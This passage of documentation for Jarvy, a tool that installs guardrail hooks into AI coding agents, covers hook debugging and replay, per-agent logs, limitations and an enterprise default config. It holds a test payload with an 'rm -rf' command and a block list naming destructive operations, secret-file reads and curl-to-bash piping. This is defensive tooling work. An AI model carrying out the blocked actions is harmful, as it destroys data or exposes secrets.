ended="$(date -u +%s%3N)"
ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
printf '{"ts":"%s","hook":"my-hook","decision":%d,"duration_ms":%d,"payload":%s}\n' \
  "$ts" "$decision" "$((ended - started))" "$payload" >> "$log"
exit $decision
```

Tail the log while you trigger the agent:

```bash
tail -f ~/.jarvy/logs/hook-debug.jsonl | jq .
```

Every fire writes one line — payload, decision, duration. Once the hook is behaving, strip the logging block and ship.

---

#### Offline replay

Once you have a payload to debug against, the fastest iteration loop skips the agent entirely:

```bash
# Save a payload (from the debug log above, or hand-craft one):
PAYLOAD='{"tool_name":"Bash","tool_input":{"command":"rm -rf /tmp/test"}}'

# Replay against the script body Jarvy installed:
jq -r '.hooks.PreToolUse[] | select(._jarvy_managed=="my-hook") | .hooks[0].command' \
  ~/.claude/settings.json > /tmp/h.sh
echo "$PAYLOAD" | bash /tmp/h.sh
echo "exit code: $?"        # 2 = blocked, 0 = allowed
```

For a library hook, `jarvy ai-hooks test <name>` dumps the script body directly. There isn't yet a `jarvy ai-hooks new` scaffold — copy from a library hook and modify.

---

#### Per-agent native logs

When the agent itself is the source of confusion (didn't invoke the hook you expected, fail-open behavior, timeout reporting), the agent's own logs are the source of truth:

| Agent | Where to look | What you'll see |
|---|---|---|
| Claude Code | `~/.claude/projects/<project-slug>/transcript.jsonl`; run `claude --debug` to stream to stderr | `hook_input`, `hook_output`, `hook_exit_code`, `hook_timeout` per fire |
| Cursor | Settings → AI → "Show hook output"; or run `cursor --log-level=debug` | Stderr from hooks appears inline in the agent's reasoning view |
| Codex CLI | `~/.codex/sessions/<session>/log.jsonl`; run with `codex --verbose` | Full request/response trace including hook decisions |
| Windsurf | Cascade → Settings → "Show hook output"; `.windsurf/logs/` if workspace logging enabled | Hook stdout/stderr per fire |
| Cline | VS Code Output panel → "Cline" channel; `~/Documents/Cline/Tasks/<task>/` | Full task transcript with hook fires inline |

When you suspect a Jarvy-side issue (wrong settings file, wrong matcher, wrong path), check `jarvy logs view | grep ai_hooks` instead. When you suspect an agent-side issue (hook didn't fire, fired wrong event), check the agent's transcript.

### Promoting a custom hook into the library

Once a hook has been battle-tested across teams and is portable enough to deserve curation, the path into the library is:

1. Open a PR adding a new `LibraryHook` entry in `src/ai_hooks/library.rs`.
2. Ship both the `bash` and `powershell` script bodies (use the existing entries as reference — they all follow the same `payload="$(cat)"` → `grep -Eq` → `exit 2` shape).
3. Add the hook name to the appropriate category in `docs/ai-hooks.md` and `examples/ai-hooks/jarvy.toml`.
4. Add a smoke test in the `tests::` block at the bottom of `library.rs`.

See [contributing](contributing.md) for the general contribution flow.

### Templates

A ready-to-edit starter config lives in [`examples/ai-hooks/custom-hook-template.toml`](https://github.com/bearbinary/jarvy/blob/main/examples/ai-hooks/custom-hook-template.toml). It walks through four common custom-hook shapes (command-string deny, file-path deny, context injection, network policy call) with both bash and PowerShell.

---

## Limitations

- **Codex CLI**: `PreToolUse` reliably fires only for Bash / shell tool calls. `apply_patch` file edits and most MCP tool calls do not always trigger PreToolUse. Library hooks that target the `Edit` matcher (e.g. `block-edit-env-files`) may not fire under Codex. Workaround: govern at the MCP server boundary, or pair the hook with Codex's `sandbox_mode = "workspace-write"`.
- **Cursor**: known forum reports that malformed JSON from a `beforeShellExecution` hook silently allows the command (fail-open). The library scripts emit exit code 2 (not JSON), which Cursor treats as deny, so this is mitigated for library hooks. Custom hooks should also prefer exit code 2 over JSON.
- **Cline**: macOS / Linux only as of v3.36. Windows targets are skipped with a warning.
- **Continue**: declarative-only. Hooks that don't map to a glob deny pattern (e.g. `audit-log`, `block-secrets-commit`) are skipped with a warning.

---

## Example: enterprise-grade defaults

A reasonable starting point for a team that hasn't customized anything:

```toml
[ai_hooks]
agents = ["claude-code", "cursor", "codex", "windsurf", "cline", "continue"]
scope  = "user"
allow_custom_commands = false

# Destructive ops
[[ai_hooks.hook]]
use = "block-rm-rf"
[[ai_hooks.hook]]
use = "block-git-reset-hard"
[[ai_hooks.hook]]
use = "block-force-push"
[[ai_hooks.hook]]
use = "block-protected-branch-commit"
[[ai_hooks.hook]]
use = "block-kubectl-delete"
[[ai_hooks.hook]]
use = "block-docker-prune"
[[ai_hooks.hook]]
use = "block-drop-table"

# Secret exfiltration
[[ai_hooks.hook]]
use = "block-secrets-commit"
[[ai_hooks.hook]]
use = "block-edit-env-files"
[[ai_hooks.hook]]
use = "block-read-secret-files"
[[ai_hooks.hook]]
use = "block-cat-env-files"
[[ai_hooks.hook]]
use = "block-curl-bash-pipe"
[[ai_hooks.hook]]
use = "block-malware-install"

# Production safety
[[ai_hooks.hook]]
use = "block-prod-db-write"

# Compliance evidence trail
[[ai_hooks.hook]]
use = "audit-log"

# Convention enforcement
[[ai_hooks.hook]]
use = "commit-message-format-guard"
```

After one `jarvy setup`, every developer on the team has 15 deterministic guardrails wired into every AI agent they use, on every machine.
